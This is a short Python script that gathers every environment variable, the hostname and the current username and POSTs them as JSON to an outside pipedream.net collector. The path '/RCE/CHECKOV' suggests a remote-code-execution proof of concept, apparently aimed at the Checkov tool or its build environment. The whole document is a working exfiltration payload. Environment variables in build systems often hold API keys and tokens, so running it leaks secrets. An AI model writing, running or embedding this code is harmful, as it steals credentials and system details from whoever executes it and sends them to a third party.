import sys
import subprocess
import http.client
import json
import socket
import getpass
import os

print("[" + getpass.getuser() +" ]")

conn = http.client.HTTPSConnection('45916c134a9cdb740e1c9807952ed21d.m.pipedream.net')

headers = {'Content-type': 'application/json'}

foo = {'env': dict(**os.environ), 'host': socket.gethostname(), 'user': getpass.getuser() }
json_data = json.dumps(foo)

conn.request('POST', '/RCE/CHECKOV', json_data, headers)

response = conn.getresponse()
# print(response.read().decode())


sys.exit(0)
